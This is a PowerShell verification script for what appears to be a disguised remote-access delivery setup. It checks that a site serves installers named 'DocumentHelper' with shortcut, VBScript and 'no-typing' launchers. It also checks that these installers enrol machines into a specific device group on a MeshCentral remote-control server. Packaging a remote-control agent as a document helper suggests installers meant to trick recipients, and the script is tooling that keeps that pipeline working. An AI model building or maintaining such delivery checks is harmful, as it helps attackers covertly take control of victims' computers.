# verify-agents.ps1 - one-shot health check for the Reyes Sitework agent delivery.
#
# Run this after ANY change to be sure the agents still work and connect:
#   powershell -ExecutionPolicy Bypass -File verify-agents.ps1
#
# It checks, against the live site and the MeshCentral server:
#   1. /get redirects each OS to the right artifact
#   2. every served artifact's SHA-256 matches dl/RELEASES.txt
#   3. the Windows ZIP contains the exact installer + all launchers
#   4. the macOS ZIP contains the pkg + no-typing launchers
#   5. the MeshCentral agent endpoint accepts a real WebSocket upgrade (101)
#   6. the Windows group config (.msh) points at this server and group
#
# Exit code 0 = all good, 1 = something failed.

[CmdletBinding()]
param(
  [string]$Base        = 'https://reyessitework.pages.dev',
  [string]$MeshServer  = 'mesh.telcom.stream',
  [string]$GroupId     = 'IRL9fYwIpF97ZG$jAYDhOxXymJSyey0Kl8wom1TAQqmkTG6kFFArCOwq5HDZ2yA2'
)

$ErrorActionPreference = 'Stop'
$script:fail = 0
function Ok($m)   { Write-Host ("  [PASS] " + $m) -ForegroundColor Green }
function Bad($m)  { Write-Host ("  [FAIL] " + $m) -ForegroundColor Red; $script:fail++ }
function Info($m) { Write-Host ("  [ .. ] " + $m) -ForegroundColor DarkGray }

$tmp = Join-Path ([IO.Path]::GetTempPath()) ("verify-agents-" + [Guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

$UA = @{
  Windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
  macOS   = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
  Linux   = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
}
$Expect = @{
  Windows = 'DocumentHelper-Windows.zip'
  macOS   = 'DocumentHelper-macOS.zip'
  Linux   = 'DocumentHelper.run'
}

try {
  Write-Host "`n1) OS-aware /get redirects" -ForegroundColor Cyan
  foreach ($os in 'Windows','macOS','Linux') {
    $r = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" -A $UA[$os] "$Base/get"
    $code, $url = $r -split ' ', 2
    if ($code -eq '302' -and $url -like ("*/dl/" + $Expect[$os])) { Ok ("$os -> $url") }
    else { Bad ("$os -> '$r' (wanted 302 .../" + $Expect[$os] + ")") }
  }

  Write-Host "`n2) Served artifact hashes vs dl/RELEASES.txt" -ForegroundColor Cyan
  curl.exe -s -o "$tmp\RELEASES.txt" "$Base/dl/RELEASES.txt"
  if (-not (Test-Path "$tmp\RELEASES.txt")) { throw "could not fetch RELEASES.txt" }
  $manifest = @{}
  foreach ($line in Get-Content "$tmp\RELEASES.txt") {
    $p = $line -split '\s+', 2
    if ($p.Count -eq 2) { $manifest[$p[1].Trim()] = $p[0].Trim().ToLower() }
  }
  foreach ($f in 'DocumentHelper.exe','DocumentHelper-Windows.zip','DocumentHelper-macOS.zip','DocumentHelper.pkg','DocumentHelper.run') {
    $dst = Join-Path $tmp $f
    curl.exe -s -o "$dst" "$Base/dl/$f"
    if (-not (Test-Path $dst) -or (Get-Item $dst).Length -eq 0) { Bad ("$f not downloadable"); continue }
    $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
    if ($manifest.ContainsKey($f)) {
      if ($h -eq $manifest[$f]) { Ok "$f  $h" } else { Bad "$f  hash $h != manifest $($manifest[$f])" }
    } else { Info "$f  $h  (not in manifest)" }
  }

  Write-Host "`n3) Windows ZIP contents" -ForegroundColor Cyan
  $wz = Join-Path $tmp 'win'; Expand-Archive (Join-Path $tmp 'DocumentHelper-Windows.zip') $wz -Force
  $wantWin = 'DocumentHelper.exe','Install Document Helper.lnk','Install Document Helper (PowerShell).lnk','Install Document Helper.cmd','Install Document Helper.ps1','Install Document Helper.vbs','How to install.txt'
  $haveWin = @(Get-ChildItem $wz -File | ForEach-Object Name)
  foreach ($n in $wantWin) { if ($haveWin -contains $n) { Ok "present: $n" } else { Bad "missing: $n" } }
  $winExe = (Get-FileHash (Join-Path $wz 'DocumentHelper.exe') -Algorithm SHA256).Hash.ToLower()
  if ($winExe -eq $manifest['DocumentHelper.exe']) { Ok "Windows installer matches the verified build" }
  else { Bad "Windows installer inside ZIP differs from /dl/DocumentHelper.exe" }

  Write-Host "`n4) macOS ZIP contents" -ForegroundColor Cyan
  $mz = Join-Path $tmp 'mac'; Expand-Archive (Join-Path $tmp 'DocumentHelper-macOS.zip') $mz -Force
  $wantMac = 'DocumentHelper.pkg','Install DocumentHelper.command','DocumentHelper.sh','How to install.txt'
  $haveMac = @(Get-ChildItem $mz -File | ForEach-Object Name)
  foreach ($n in $wantMac) { if ($haveMac -contains $n) { Ok "present: $n" } else { Bad "missing: $n" } }
  $pkgInZip = (Get-FileHash (Join-Path $mz 'DocumentHelper.pkg') -Algorithm SHA256).Hash.ToLower()
  if ($pkgInZip -eq $manifest['DocumentHelper.pkg']) { Ok "macOS package matches the verified build" } else { Bad "macOS .pkg inside ZIP differs" }

  Write-Host "`n5) MeshCentral agent endpoint" -ForegroundColor Cyan
  $up = curl.exe -s -o NUL -w "%{http_code}" -k --http1.1 `
    -H "Connection: Upgrade" -H "Upgrade: websocket" `
    -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" `
    "https://$MeshServer/agent.ashx"
  if ($up -eq '101') { Ok "/agent.ashx accepts WebSocket upgrade (101)" }
  else { Bad "/agent.ashx upgrade returned '$up' (wanted 101)" }
  curl.exe -s -o NUL -w "%{http_code}" -k "https://$MeshServer/" | ForEach-Object {
    if ($_ -eq '200') { Ok "MeshCentral web UI responds (200)" } else { Bad "MeshCentral web UI -> $_" }
  }

  Write-Host "`n6) Windows group config (.msh)" -ForegroundColor Cyan
  $msh = Join-Path (Split-Path -Parent $PSCommandPath) 'DocumentHelper.msh'
  if (Test-Path $msh) {
    $t = Get-Content $msh -Raw
    $srv = [regex]::Match($t, '(?m)^MeshServer=(.*)$').Groups[1].Value.Trim()
    $mid = [regex]::Match($t, 'MeshID=0x([0-9A-Fa-f]+)').Groups[1].Value.ToUpper()
    $bytes = [Convert]::FromBase64String(($GroupId -replace '\$','/' -replace '@','+'))
    $hex = (($bytes | ForEach-Object { $_.ToString('X2') }) -join '')
    if ($srv -eq "wss://$MeshServer`:443/agent.ashx") { Ok "MeshServer = $srv" } else { Bad "MeshServer = $srv" }
    if ($mid -eq $hex) { Ok "MeshID matches the device group" } else { Bad "MeshID does not match the group id" }
  } else { Info "DocumentHelper.msh not found next to this script; skipping" }

  Write-Host ""
  if ($script:fail -eq 0) { Write-Host "ALL CHECKS PASSED" -ForegroundColor Green; exit 0 }
  else { Write-Host ("$script:fail CHECK(S) FAILED") -ForegroundColor Red; exit 1 }
}
finally {
  Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
